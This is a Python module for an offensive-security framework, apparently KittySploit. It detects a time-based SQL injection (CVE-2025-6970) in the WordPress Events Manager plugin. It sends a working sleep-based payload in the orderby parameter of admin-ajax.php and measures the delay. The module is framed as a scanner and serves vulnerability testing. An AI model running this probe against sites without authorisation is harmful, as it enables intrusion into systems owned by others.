#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Events Manager <= 7.0.3 orderby SQLi (CVE-2025-6970)."""

import time

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "events-manager"
_VULN_HIGH = (7, 0, 3)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Events Manager CVE-2025-6970 SQLi detect",
        "description": "Time-based SQLi via admin-ajax search_events orderby parameter.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-6970",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-6970"],
        "modules": ["auxiliary/admin/http/events_manager_cve_2025_6970_sqli"],
        "tags": ["web", "scanner", "wordpress", "events-manager", "sqli", "cve-2025-6970"],
        "agent": {"approval_required": True},
    }

    base_path = OptString("/", "WordPress base path", required=False)
    sleep_seconds = OptInteger(8, "Sleep for time-based test", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _timed_post(self, orderby: str) -> float:
        start = time.monotonic()
        r = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            data=f"action=search_events&orderby={orderby}",
            allow_redirects=False,
            timeout=35,
        )
        elapsed = time.monotonic() - start
        if r and r.status_code == 200 and "em-item" in (r.text or ""):
            return elapsed
        return 0.0

    def run(self):
        version = self.wp_plugin_version(_PLUGIN, self.wp_normalize_base_path(self.base_path or "/")) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        sleep_s = int(self.sleep_seconds or 8)
        base_t = self._timed_post("1") or 0.1
        inj = f"1*(select(sleep({sleep_s})))"
        delayed = self._timed_post(inj)
        if delayed >= sleep_s - 1 and delayed > base_t + (sleep_s - 2):
            self.set_info(
                severity="critical",
                reason="Events Manager CVE-2025-6970 orderby time-based SQLi",
                path="/wp-admin/admin-ajax.php",
                cve="CVE-2025-6970",
            )
            return True
        return False
